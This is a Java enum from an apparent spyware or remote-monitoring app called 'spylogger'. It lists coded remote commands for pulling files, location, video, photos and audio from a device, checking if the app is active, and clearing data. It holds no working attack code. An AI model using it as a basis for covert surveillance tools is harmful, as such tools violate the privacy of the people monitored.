package com.gravatasufoca.spylogger.model;

import com.google.gson.annotations.SerializedName;

/**
 * Created by bruno on 04/01/17.
 */
public enum TipoAcao {
    @SerializedName("0")
    RECUPERAR_ARQUIVO,
    @SerializedName("1")
    OBTER_LOCALIZACAO,
    @SerializedName("2")
    OBTER_VIDEO,
    @SerializedName("3")
    OBTER_FOTO,
    @SerializedName("4")
    OBTER_AUDIO,
    @SerializedName("5")
    ESTA_ATIVO,
    @SerializedName("6")
    CONFIGURACAO,
    @SerializedName("7")
    SOLICITAR_REENVIO,
    @SerializedName("8")
    LIMPAR;

}
